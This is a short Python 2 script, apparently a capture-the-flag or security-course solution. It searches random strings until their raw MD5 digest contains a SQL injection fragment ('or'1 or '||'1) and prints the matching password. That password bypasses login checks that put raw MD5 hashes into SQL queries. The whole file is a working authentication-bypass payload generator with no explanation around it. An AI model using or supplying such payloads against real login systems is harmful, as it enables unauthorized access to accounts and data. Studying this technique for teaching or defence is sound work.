from pymd5 import md5
import urllib
import random
import string

def find_sub(text):
	return ((text.find("'or'1") != -1) or (text.find("'||'1") != -1))

string_found = 0

while not string_found:
	text = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(40)])
	md5_text = md5(text)
	md5_text = urllib.quote(md5_text.digest())
	string_found = find_sub(md5_text);


print "Password = ", text
print "Hashed Password = ", md5_text
print "Found substring = ", string_found
